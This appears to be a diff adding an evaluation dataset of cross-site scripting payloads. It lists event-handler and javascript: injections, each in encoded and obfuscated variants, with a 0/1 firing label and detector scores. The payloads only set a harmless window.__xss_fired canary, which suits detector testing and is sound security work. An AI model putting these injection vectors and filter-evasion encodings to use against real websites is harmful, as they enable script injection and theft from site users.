@@ -1,0 +1,633 @@
+norm_text,ex,score,score_renamed
+"<style>:target {color:red;}</style><image id=x style=""transition:color 1s"" ontransitionend=window.__xss_fired=true></image>",0,0.9999348,0.9999304
+%3cstyle%3e:target%20{color:red;}%3c/style%3e%3cimage%20id%3dx%20style%3d%22transition:color%201s%22%20ontransitionend%3dwindow.__xss_fired%3dtrue%3e%3c/image%3e,0,0.99981874,0.9995977
+&#60;style&#62;:target {color:red;}&#60;/style&#62;&#60;image id=x style=&#34;transition:color 1s&#34; ontransitionend=window.__xss_fired=true&#62;&#60;/image&#62;,0,0.9999337,0.99992967
+"<style>:target {color:red;}</style><image id=x style=""transition:color 1s"" ontransitionend=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;></image>",0,0.9999312,0.99992514
+"""><svg onload=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;>",1,0.99993265,0.99993634
+"<style>:target {color:red;}</style><image id=x style=""transition:color 1s"" ontransitionend=window['__xss_fired']=true></image>",0,0.9999325,0.9999223
+"<style>:target {color:red;}</style><image id=x style=""transition:color 1s"" ontransitionend=window['__xss'+'_fired']=true></image>",0,0.9999331,0.9999219
+"<style>:target {color:red;}</style><image id=x style=""transition:color 1s"" ontransitionend=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true></image>",0,0.9999273,0.99991894
+""";window['__xss_fired']=true;//",1,0.9999256,0.9998909
+<keygen id=x tabindex=1 onbeforedeactivate=window.__xss_fired=true></keygen><input autofocus>,0,0.9999337,0.9999342
+%3ckeygen%20id%3dx%20tabindex%3d1%20onbeforedeactivate%3dwindow.__xss_fired%3dtrue%3e%3c/keygen%3e%3cinput%20autofocus%3e,0,0.99989116,0.99988437
+&#60;keygen id=x tabindex=1 onbeforedeactivate=window.__xss_fired=true&#62;&#60;/keygen&#62;&#60;input autofocus&#62;,0,0.9999306,0.9999317
+<keygen id=x tabindex=1 onbeforedeactivate=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;></keygen><input autofocus>,0,0.9999354,0.9999366
+<keygen id=x tabindex=1 onbeforedeactivate=window['__xss_fired']=true></keygen><input autofocus>,0,0.9999347,0.9999343
+<keygen id=x tabindex=1 onbeforedeactivate=window['__xss'+'_fired']=true></keygen><input autofocus>,0,0.9999372,0.9999368
+<keygen id=x tabindex=1 onbeforedeactivate=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true></keygen><input autofocus>,0,0.99993324,0.9999347
+"<style>:target {color:red;}</style><div id=x style=""transition:color 1s"" ontransitionend=window.__xss_fired=true></div>",0,0.9999362,0.99993145
+%3cstyle%3e:target%20{color:red;}%3c/style%3e%3cdiv%20id%3dx%20style%3d%22transition:color%201s%22%20ontransitionend%3dwindow.__xss_fired%3dtrue%3e%3c/div%3e,0,0.9998241,0.99954826
+&#60;style&#62;:target {color:red;}&#60;/style&#62;&#60;div id=x style=&#34;transition:color 1s&#34; ontransitionend=window.__xss_fired=true&#62;&#60;/div&#62;,0,0.9999341,0.99993074
+"<style>:target {color:red;}</style><div id=x style=""transition:color 1s"" ontransitionend=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;></div>",0,0.99993145,0.999926
+"<style>:target {color:red;}</style><div id=x style=""transition:color 1s"" ontransitionend=window['__xss_fired']=true></div>",0,0.9999336,0.9999229
+"<style>:target {color:red;}</style><div id=x style=""transition:color 1s"" ontransitionend=window['__xss'+'_fired']=true></div>",0,0.9999335,0.99992144
+"<style>:target {color:red;}</style><div id=x style=""transition:color 1s"" ontransitionend=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true></div>",0,0.9999267,0.99991965
+"<dialog onbeforepaste=""window.__xss_fired=true"" contenteditable>test</dialog>",1,0.9999422,0.9999374
+%3cdialog%20onbeforepaste%3d%22window.__xss_fired%3dtrue%22%20contenteditable%3etest%3c/dialog%3e,1,0.99992,0.99989915
+&#60;dialog onbeforepaste=&#34;window.__xss_fired=true&#34; contenteditable&#62;test&#60;/dialog&#62;,0,0.9999397,0.99993885
+"<dialog onbeforepaste=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"" contenteditable>test</dialog>",1,0.9999392,0.99993944
+"<dialog onbeforepaste=""window['__xss_fired']=true"" contenteditable>test</dialog>",1,0.99994075,0.9999331
+"<dialog onbeforepaste=""window['__xss'+'_fired']=true"" contenteditable>test</dialog>",1,0.9999392,0.999931
+"<dialog onbeforepaste=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"" contenteditable>test</dialog>",1,0.9999361,0.9999355
+"<td draggable=""true"" ondragleave=""window.__xss_fired=true"">test</td>",0,0.9999362,0.99993217
+%3ctd%20draggable%3d%22true%22%20ondragleave%3d%22window.__xss_fired%3dtrue%22%3etest%3c/td%3e,0,0.9999192,0.9999001
+&#60;td draggable=&#34;true&#34; ondragleave=&#34;window.__xss_fired=true&#34;&#62;test&#60;/td&#62;,0,0.999938,0.9999366
+"<td draggable=""true"" ondragleave=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</td>",0,0.99994063,0.9999398
+"<td draggable=""true"" ondragleave=""window['__xss_fired']=true"">test</td>",0,0.9999348,0.999926
+"<td draggable=""true"" ondragleave=""window['__xss'+'_fired']=true"">test</td>",0,0.99993706,0.9999285
+"<td draggable=""true"" ondragleave=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</td>",0,0.99993265,0.9999331
+"<style>:target {color:red;}</style><address id=x style=""transition:color 1s"" ontransitionend=window.__xss_fired=true></address>",0,0.9999347,0.9999286
+%3cstyle%3e:target%20{color:red;}%3c/style%3e%3caddress%20id%3dx%20style%3d%22transition:color%201s%22%20ontransitionend%3dwindow.__xss_fired%3dtrue%3e%3c/address%3e,0,0.99975544,0.9994417
+&#60;style&#62;:target {color:red;}&#60;/style&#62;&#60;address id=x style=&#34;transition:color 1s&#34; ontransitionend=window.__xss_fired=true&#62;&#60;/address&#62;,0,0.9999347,0.9999306
+"<style>:target {color:red;}</style><address id=x style=""transition:color 1s"" ontransitionend=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;></address>",0,0.99993026,0.99992585
+"<style>:target {color:red;}</style><address id=x style=""transition:color 1s"" ontransitionend=window['__xss_fired']=true></address>",0,0.9999312,0.9999199
+"<style>:target {color:red;}</style><address id=x style=""transition:color 1s"" ontransitionend=window['__xss'+'_fired']=true></address>",0,0.9999312,0.9999188
+"<style>:target {color:red;}</style><address id=x style=""transition:color 1s"" ontransitionend=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true></address>",0,0.9999262,0.9999174
+"<caption onpaste=""window.__xss_fired=true"" contenteditable>test</caption>",0,0.9999373,0.99993217
+%3ccaption%20onpaste%3d%22window.__xss_fired%3dtrue%22%20contenteditable%3etest%3c/caption%3e,0,0.9999021,0.9998578
+&#60;caption onpaste=&#34;window.__xss_fired=true&#34; contenteditable&#62;test&#60;/caption&#62;,0,0.9999386,0.9999387
+"<caption onpaste=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"" contenteditable>test</caption>",0,0.9999391,0.99993885
+"<caption onpaste=""window['__xss_fired']=true"" contenteditable>test</caption>",0,0.9999366,0.9999261
+"<caption onpaste=""window['__xss'+'_fired']=true"" contenteditable>test</caption>",0,0.9999356,0.9999236
+"<caption onpaste=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"" contenteditable>test</caption>",0,0.9999287,0.9999275
+"<label oncopy=""window.__xss_fired=true"" contenteditable>test</label>",1,0.99994135,0.99992526
+%3clabel%20oncopy%3d%22window.__xss_fired%3dtrue%22%20contenteditable%3etest%3c/label%3e,1,0.99990904,0.9998677
+&#60;label oncopy=&#34;window.__xss_fired=true&#34; contenteditable&#62;test&#60;/label&#62;,0,0.9999393,0.9999366
+"<label oncopy=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"" contenteditable>test</label>",1,0.99993694,0.9999335
+"<label oncopy=""window['__xss_fired']=true"" contenteditable>test</label>",1,0.9999356,0.9999026
+"<label oncopy=""window['__xss'+'_fired']=true"" contenteditable>test</label>",1,0.99993277,0.9999007
+"<label oncopy=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"" contenteditable>test</label>",1,0.99993324,0.99992776
+<svg><footer onload=window.__xss_fired=true></footer>,0,0.9999294,0.9999199
+%3csvg%3e%3cfooter%20onload%3dwindow.__xss_fired%3dtrue%3e%3c/footer%3e,0,0.99991477,0.99986506
+&#60;svg&#62;&#60;footer onload=window.__xss_fired=true&#62;&#60;/footer&#62;,0,0.9999398,0.9999393
+<svg><footer onload=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;></footer>,0,0.9999361,0.99993384
+<svg><footer onload=window['__xss_fired']=true></footer>,0,0.9999249,0.99990547
+<svg><footer onload=window['__xss'+'_fired']=true></footer>,0,0.9999274,0.9999049
+<svg><footer onload=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true></footer>,0,0.99993277,0.9999254
+<iframe onpointerdown=window.__xss_fired=true>xss</iframe>,1,0.99994075,0.99994063
+%3ciframe%20onpointerdown%3dwindow.__xss_fired%3dtrue%3exss%3c/iframe%3e,1,0.9999305,0.9999261
+&#60;iframe onpointerdown=window.__xss_fired=true&#62;xss&#60;/iframe&#62;,0,0.9999411,0.9999416
+<iframe onpointerdown=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;>xss</iframe>,1,0.99993587,0.99994123
+<iframe onpointerdown=window['__xss_fired']=true>xss</iframe>,1,0.999941,0.9999398
+<iframe onpointerdown=window['__xss'+'_fired']=true>xss</iframe>,1,0.99994135,0.9999404
+<iframe onpointerdown=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true>xss</iframe>,1,0.99993503,0.9999361
+<cite onpointermove=window.__xss_fired=true>xss</cite>,1,0.9999416,0.9999411
+%3ccite%20onpointermove%3dwindow.__xss_fired%3dtrue%3exss%3c/cite%3e,1,0.9999274,0.99992764
+&#60;cite onpointermove=window.__xss_fired=true&#62;xss&#60;/cite&#62;,0,0.99994147,0.9999418
+<cite onpointermove=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;>xss</cite>,1,0.9999354,0.9999397
+<cite onpointermove=window['__xss_fired']=true>xss</cite>,1,0.999941,0.99993765
+<cite onpointermove=window['__xss'+'_fired']=true>xss</cite>,1,0.99993896,0.9999347
+<cite onpointermove=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true>xss</cite>,1,0.9999398,0.99993753
+"<select onmouseover=""window.__xss_fired=true"">test</select>",1,0.99993825,0.9999325
+%3cselect%20onmouseover%3d%22window.__xss_fired%3dtrue%22%3etest%3c/select%3e,1,0.9999205,0.9999181
+&#60;select onmouseover=&#34;window.__xss_fired=true&#34;&#62;test&#60;/select&#62;,0,0.9999355,0.9999356
+"<select onmouseover=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</select>",1,0.99993813,0.99993706
+"<select onmouseover=""window['__xss_fired']=true"">test</select>",1,0.9999348,0.9999244
+"<select onmouseover=""window['__xss'+'_fired']=true"">test</select>",1,0.99993396,0.99992406
+"<select onmouseover=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</select>",1,0.9999336,0.99993217
+"<slot oncontextmenu=""window.__xss_fired=true"">test</slot>",1,0.99993527,0.9999249
+%3cslot%20oncontextmenu%3d%22window.__xss_fired%3dtrue%22%3etest%3c/slot%3e,1,0.9999156,0.9999074
+&#60;slot oncontextmenu=&#34;window.__xss_fired=true&#34;&#62;test&#60;/slot&#62;,0,0.9999329,0.9999331
+"<slot oncontextmenu=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</slot>",1,0.9999355,0.999933
+"<slot oncontextmenu=""window['__xss_fired']=true"">test</slot>",1,0.99992776,0.9999087
+"<slot oncontextmenu=""window['__xss'+'_fired']=true"">test</slot>",1,0.9999294,0.9999118
+"<slot oncontextmenu=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</slot>",1,0.9999292,0.99992776
+"<sub oncopy=""window.__xss_fired=true"" contenteditable>test</sub>",1,0.99994135,0.99993086
+%3csub%20oncopy%3d%22window.__xss_fired%3dtrue%22%20contenteditable%3etest%3c/sub%3e,1,0.99991417,0.9998995
+&#60;sub oncopy=&#34;window.__xss_fired=true&#34; contenteditable&#62;test&#60;/sub&#62;,0,0.9999422,0.9999409
+"<sub oncopy=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"" contenteditable>test</sub>",1,0.9999378,0.9999362
+"<sub oncopy=""window['__xss_fired']=true"" contenteditable>test</sub>",1,0.9999374,0.9999137
+"<sub oncopy=""window['__xss'+'_fired']=true"" contenteditable>test</sub>",1,0.9999348,0.99991024
+"<sub oncopy=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"" contenteditable>test</sub>",1,0.9999343,0.99993074
+<form><button formaction=javascript&colon;window.__xss_fired=true>,0,0.99993765,0.99993026
+%3cform%3e%3cbutton%20formaction%3djavascript%26colon;window.__xss_fired%3dtrue%3e,0,0.9999305,0.9999249
+&#60;form&#62;&#60;button formaction=javascript&#38;colon;window.__xss_fired=true&#62;,0,0.99994135,0.9999418
+<form><button formaction=javascript&colon;window['__xss_fired']=true>,0,0.99993515,0.99992156
+<form><button formaction=javascript&colon;window['__xss'+'_fired']=true>,0,0.9999361,0.99992096
+<form><button formaction=javascript&colon;window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true>,0,0.9999398,0.9999385
+<blockquote onfocusout=window.__xss_fired=true tabindex=1 id=x></blockquote><input autofocus>,1,0.9999293,0.99992776
+%3cblockquote%20onfocusout%3dwindow.__xss_fired%3dtrue%20tabindex%3d1%20id%3dx%3e%3c/blockquote%3e%3cinput%20autofocus%3e,1,0.99982554,0.9997316
+&#60;blockquote onfocusout=window.__xss_fired=true tabindex=1 id=x&#62;&#60;/blockquote&#62;&#60;input autofocus&#62;,0,0.9999336,0.99993455
+<blockquote onfocusout=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101; tabindex=1 id=x></blockquote><input autofocus>,1,0.9999331,0.9999325
+<blockquote onfocusout=window['__xss_fired']=true tabindex=1 id=x></blockquote><input autofocus>,1,0.9999273,0.99992204
+<blockquote onfocusout=window['__xss'+'_fired']=true tabindex=1 id=x></blockquote><input autofocus>,1,0.9999268,0.9999205
+<blockquote onfocusout=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true tabindex=1 id=x></blockquote><input autofocus>,1,0.9999269,0.99992466
+"<div draggable=""true"" contenteditable>drag me</div><bdi ondragover=window.__xss_fired=true contenteditable>drop here</bdi>",1,0.99993825,0.9999324
+%3cdiv%20draggable%3d%22true%22%20contenteditable%3edrag%20me%3c/div%3e%3cbdi%20ondragover%3dwindow.__xss_fired%3dtrue%20contenteditable%3edrop%20here%3c/bdi%3e,1,0.99974734,0.99928755
+&#60;div draggable=&#34;true&#34; contenteditable&#62;drag me&#60;/div&#62;&#60;bdi ondragover=window.__xss_fired=true contenteditable&#62;drop here&#60;/bdi&#62;,0,0.9999349,0.9999292
+"<div draggable=""true"" contenteditable>drag me</div><bdi ondragover=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101; contenteditable>drop here</bdi>",1,0.9999366,0.99993217
+"<div draggable=""true"" contenteditable>drag me</div><bdi ondragover=window['__xss_fired']=true contenteditable>drop here</bdi>",1,0.99993694,0.9999249
+"<div draggable=""true"" contenteditable>drag me</div><bdi ondragover=window['__xss'+'_fired']=true contenteditable>drop here</bdi>",1,0.99993503,0.9999167
+"<div draggable=""true"" contenteditable>drag me</div><bdi ondragover=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true contenteditable>drop here</bdi>",1,0.99992454,0.999899
+<hr onpointerout=window.__xss_fired=true>xss</hr>,1,0.99994147,0.9999405
+%3chr%20onpointerout%3dwindow.__xss_fired%3dtrue%3exss%3c/hr%3e,1,0.999928,0.99992883
+&#60;hr onpointerout=window.__xss_fired=true&#62;xss&#60;/hr&#62;,0,0.999941,0.99994147
+<hr onpointerout=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;>xss</hr>,1,0.99993587,0.999941
+<hr onpointerout=window['__xss_fired']=true>xss</hr>,1,0.999941,0.99993813
+<hr onpointerout=window['__xss'+'_fired']=true>xss</hr>,1,0.9999404,0.99993765
+<hr onpointerout=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true>xss</hr>,1,0.9999405,0.9999399
+"<track onmouseover=""window.__xss_fired=true"">test</track>",1,0.999938,0.9999292
+%3ctrack%20onmouseover%3d%22window.__xss_fired%3dtrue%22%3etest%3c/track%3e,1,0.99991906,0.9999093
+&#60;track onmouseover=&#34;window.__xss_fired=true&#34;&#62;test&#60;/track&#62;,0,0.99993455,0.99993455
+"<track onmouseover=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</track>",1,0.9999378,0.99993825
+"<track onmouseover=""window['__xss_fired']=true"">test</track>",1,0.99993515,0.9999188
+"<track onmouseover=""window['__xss'+'_fired']=true"">test</track>",1,0.9999347,0.9999199
+"<track onmouseover=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</track>",1,0.9999347,0.99993205
+"<mark oncontextmenu=""window.__xss_fired=true"">test</mark>",1,0.9999368,0.9999268
+%3cmark%20oncontextmenu%3d%22window.__xss_fired%3dtrue%22%3etest%3c/mark%3e,1,0.9999219,0.99991333
+&#60;mark oncontextmenu=&#34;window.__xss_fired=true&#34;&#62;test&#60;/mark&#62;,0,0.9999343,0.9999329
+"<mark oncontextmenu=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</mark>",1,0.9999366,0.99993443
+"<mark oncontextmenu=""window['__xss_fired']=true"">test</mark>",1,0.9999306,0.99991226
+"<mark oncontextmenu=""window['__xss'+'_fired']=true"">test</mark>",1,0.9999306,0.9999143
+"<mark oncontextmenu=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</mark>",1,0.9999305,0.99992776
+"<script onmousemove=""window.__xss_fired=true"">test</script>",1,0.9999416,0.9999386
+%3cscript%20onmousemove%3d%22window.__xss_fired%3dtrue%22%3etest%3c/script%3e,1,0.9999354,0.9999367
+&#60;script onmousemove=&#34;window.__xss_fired=true&#34;&#62;test&#60;/script&#62;,0,0.9999397,0.9999404
+"<script onmousemove=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</script>",1,0.99994206,0.9999442
+"<script onmousemove=""window['__xss_fired']=true"">test</script>",1,0.99994063,0.99993634
+"<script onmousemove=""window['__xss'+'_fired']=true"">test</script>",1,0.99994147,0.999938
+"<script onmousemove=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</script>",1,0.9999387,0.99993885
+"<link draggable=""true"" ondragend=""window.__xss_fired=true"">test</link>",1,0.99993896,0.9999348
+%3clink%20draggable%3d%22true%22%20ondragend%3d%22window.__xss_fired%3dtrue%22%3etest%3c/link%3e,1,0.9999201,0.99990356
+&#60;link draggable=&#34;true&#34; ondragend=&#34;window.__xss_fired=true&#34;&#62;test&#60;/link&#62;,0,0.99993837,0.99993813
+"<link draggable=""true"" ondragend=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</link>",1,0.9999422,0.99994206
+"<link draggable=""true"" ondragend=""window['__xss_fired']=true"">test</link>",1,0.9999373,0.9999294
+"<link draggable=""true"" ondragend=""window['__xss'+'_fired']=true"">test</link>",1,0.9999385,0.9999298
+"<link draggable=""true"" ondragend=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</link>",1,0.9999316,0.9999335
+"<tbody draggable=""true"" ondragstart=""window.__xss_fired=true"">test</tbody>",0,0.9999386,0.9999349
+%3ctbody%20draggable%3d%22true%22%20ondragstart%3d%22window.__xss_fired%3dtrue%22%3etest%3c/tbody%3e,0,0.9999236,0.99991405
+&#60;tbody draggable=&#34;true&#34; ondragstart=&#34;window.__xss_fired=true&#34;&#62;test&#60;/tbody&#62;,0,0.99993837,0.9999368
+"<tbody draggable=""true"" ondragstart=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</tbody>",0,0.99994135,0.99994147
+"<tbody draggable=""true"" ondragstart=""window['__xss_fired']=true"">test</tbody>",0,0.99993825,0.99993145
+"<tbody draggable=""true"" ondragstart=""window['__xss'+'_fired']=true"">test</tbody>",0,0.9999398,0.99993324
+"<tbody draggable=""true"" ondragstart=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</tbody>",0,0.9999347,0.99993587
+<script id=x tabindex=1 onbeforedeactivate=window.__xss_fired=true></script><input autofocus>,0,0.9999378,0.9999385
+%3cscript%20id%3dx%20tabindex%3d1%20onbeforedeactivate%3dwindow.__xss_fired%3dtrue%3e%3c/script%3e%3cinput%20autofocus%3e,0,0.9999069,0.99990296
+&#60;script id=x tabindex=1 onbeforedeactivate=window.__xss_fired=true&#62;&#60;/script&#62;&#60;input autofocus&#62;,0,0.99993515,0.99993646
+<script id=x tabindex=1 onbeforedeactivate=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;></script><input autofocus>,0,0.9999393,0.99994075
+<script id=x tabindex=1 onbeforedeactivate=window['__xss_fired']=true></script><input autofocus>,0,0.9999387,0.99993885
+<script id=x tabindex=1 onbeforedeactivate=window['__xss'+'_fired']=true></script><input autofocus>,0,0.9999411,0.99994147
+<script id=x tabindex=1 onbeforedeactivate=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true></script><input autofocus>,0,0.9999372,0.9999379
+<progress onpointerleave=window.__xss_fired=true>xss</progress>,1,0.99994254,0.9999416
+%3cprogress%20onpointerleave%3dwindow.__xss_fired%3dtrue%3exss%3c/progress%3e,1,0.9999244,0.99992204
+&#60;progress onpointerleave=window.__xss_fired=true&#62;xss&#60;/progress&#62;,0,0.99994123,0.99994147
+<progress onpointerleave=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;>xss</progress>,1,0.9999366,0.9999404
+<progress onpointerleave=window['__xss_fired']=true>xss</progress>,1,0.99994195,0.99993896
+<progress onpointerleave=window['__xss'+'_fired']=true>xss</progress>,1,0.99994147,0.99993765
+<progress onpointerleave=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true>xss</progress>,1,0.99994004,0.9999397
+"<style>:target {color: red;}</style><pre id=x style=""transition:color 10s"" ontransitioncancel=window.__xss_fired=true></pre>",0,0.9999336,0.9999269
+%3cstyle%3e:target%20{color:%20red;}%3c/style%3e%3cpre%20id%3dx%20style%3d%22transition:color%2010s%22%20ontransitioncancel%3dwindow.__xss_fired%3dtrue%3e%3c/pre%3e,0,0.9996927,0.9988912
+&#60;style&#62;:target {color: red;}&#60;/style&#62;&#60;pre id=x style=&#34;transition:color 10s&#34; ontransitioncancel=window.__xss_fired=true&#62;&#60;/pre&#62;,0,0.9999336,0.99992895
+"<style>:target {color: red;}</style><pre id=x style=""transition:color 10s"" ontransitioncancel=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;></pre>",0,0.9999317,0.99992526
+"<style>:target {color: red;}</style><pre id=x style=""transition:color 10s"" ontransitioncancel=window['__xss_fired']=true></pre>",0,0.99993134,0.9999182
+"<style>:target {color: red;}</style><pre id=x style=""transition:color 10s"" ontransitioncancel=window['__xss'+'_fired']=true></pre>",0,0.99993086,0.99991536
+"<style>:target {color: red;}</style><pre id=x style=""transition:color 10s"" ontransitioncancel=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true></pre>",0,0.9999274,0.9999193
+"<style>@keyframes slidein {}</style><button style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""window.__xss_fired=true""></button>",1,0.9999155,0.9998845
+%3cstyle%3e@keyframes%20slidein%20{}%3c/style%3e%3cbutton%20style%3d%22animation-duration:1s;animation-name:slidein;animation-iteration-count:2%22%20onanimationiteration%3d%22window.__xss_fired%3dtrue%22%3e%3c/button%3e,1,0.99986506,0.9996742
+&#60;style&#62;@keyframes slidein {}&#60;/style&#62;&#60;button style=&#34;animation-duration:1s;animation-name:slidein;animation-iteration-count:2&#34; onanimationiteration=&#34;window.__xss_fired=true&#34;&#62;&#60;/button&#62;,0,0.99993324,0.99993014
+"<style>@keyframes slidein {}</style><button style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;""></button>",1,0.99992025,0.9998888
+"<style>@keyframes slidein {}</style><button style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""window['__xss_fired']=true""></button>",1,0.99989474,0.9998147
+"<style>@keyframes slidein {}</style><button style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""window['__xss'+'_fired']=true""></button>",1,0.9998827,0.9998072
+"<style>@keyframes slidein {}</style><button style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true""></button>",1,0.9998971,0.9998869
+<element id=x tabindex=1 onbeforedeactivate=window.__xss_fired=true></element><input autofocus>,0,0.9999341,0.9999343
+%3celement%20id%3dx%20tabindex%3d1%20onbeforedeactivate%3dwindow.__xss_fired%3dtrue%3e%3c/element%3e%3cinput%20autofocus%3e,0,0.99988866,0.99987626
+&#60;element id=x tabindex=1 onbeforedeactivate=window.__xss_fired=true&#62;&#60;/element&#62;&#60;input autofocus&#62;,0,0.9999323,0.9999329
+<element id=x tabindex=1 onbeforedeactivate=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;></element><input autofocus>,0,0.9999366,0.9999372
+<element id=x tabindex=1 onbeforedeactivate=window['__xss_fired']=true></element><input autofocus>,0,0.9999348,0.99993443
+<element id=x tabindex=1 onbeforedeactivate=window['__xss'+'_fired']=true></element><input autofocus>,0,0.9999379,0.9999374
+<element id=x tabindex=1 onbeforedeactivate=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true></element><input autofocus>,0,0.9999335,0.9999341
+"<colgroup oncopy=""window.__xss_fired=true"" contenteditable>test</colgroup>",0,0.9999392,0.9999275
+%3ccolgroup%20oncopy%3d%22window.__xss_fired%3dtrue%22%20contenteditable%3etest%3c/colgroup%3e,0,0.9999021,0.9998479
+&#60;colgroup oncopy=&#34;window.__xss_fired=true&#34; contenteditable&#62;test&#60;/colgroup&#62;,0,0.99994004,0.9999378
+"<colgroup oncopy=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"" contenteditable>test</colgroup>",0,0.9999368,0.9999325
+"<colgroup oncopy=""window['__xss_fired']=true"" contenteditable>test</colgroup>",0,0.9999361,0.9999124
+"<colgroup oncopy=""window['__xss'+'_fired']=true"" contenteditable>test</colgroup>",0,0.99993265,0.99990475
+"<colgroup oncopy=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"" contenteditable>test</colgroup>",0,0.99993026,0.9999238
+"<sup onkeyup=""window.__xss_fired=true"" contenteditable>test</sup>",1,0.9999416,0.9999379
+%3csup%20onkeyup%3d%22window.__xss_fired%3dtrue%22%20contenteditable%3etest%3c/sup%3e,1,0.99991894,0.9999063
+&#60;sup onkeyup=&#34;window.__xss_fired=true&#34; contenteditable&#62;test&#60;/sup&#62;,0,0.99993694,0.9999362
+"<sup onkeyup=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"" contenteditable>test</sup>",1,0.9999374,0.99994016
+"<sup onkeyup=""window['__xss_fired']=true"" contenteditable>test</sup>",1,0.9999409,0.99993515
+"<sup onkeyup=""window['__xss'+'_fired']=true"" contenteditable>test</sup>",1,0.9999405,0.99993336
+"<sup onkeyup=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"" contenteditable>test</sup>",1,0.9999348,0.9999343
+"<div draggable=""true"" contenteditable>drag me</div><content ondrop=window.__xss_fired=true contenteditable>drop here</content>",1,0.9999379,0.99992967
+%3cdiv%20draggable%3d%22true%22%20contenteditable%3edrag%20me%3c/div%3e%3ccontent%20ondrop%3dwindow.__xss_fired%3dtrue%20contenteditable%3edrop%20here%3c/content%3e,1,0.99948394,0.9973273
